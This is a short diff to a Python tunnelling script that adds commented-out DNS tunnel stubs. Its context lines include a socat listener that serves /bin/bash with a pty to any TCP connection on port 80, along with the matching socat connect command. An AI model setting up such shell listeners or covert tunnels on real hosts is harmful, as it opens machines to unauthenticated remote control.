@@ -27,6 +27,9 @@ def build_tunnel(tunnel_type, socat_port=80):
             cmd=f"ssh -tt {hostname}"
         elif tunnel == "socat":
             cmd = f"socat FILE:\`tty\`,raw,echo=0 tcp-connect:{hostname}:{socat_port}"
+        # add additional protocol tunnel establishing stuff here
+        #elif tunnel == "DNS":
+        #    cmd = f"dnstunnel {hostname}" 
         else:
             raise UserWarning(f"Invalid tunnel type {tunnel}.")
 
@@ -83,6 +86,11 @@ def start_listeners(socat_port=80):
     subprocess.run(f"tmux new -d -s socat", shell=True)
     socat_cmd = f'socat tcp-listen:{socat_port},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane'
     subprocess.run(f'tmux send-keys -t socat.0 "{socat_cmd}" Enter', shell=True)
+
+    # start dns tunnel listening script
+    #subprocess.run(f"tmux new -d -s dnslistener", shell=True)
+    #dns_cmd = f"bash dnstunnel.sh"
+    #subprocess.run(f'tmux send-keys -t dns.0 "{dns_cmd}" Enter', shell=True)
     
     # DEBUG: verify listeners are listening as expected
     #subprocess.run('netstat -antp', shell=True)
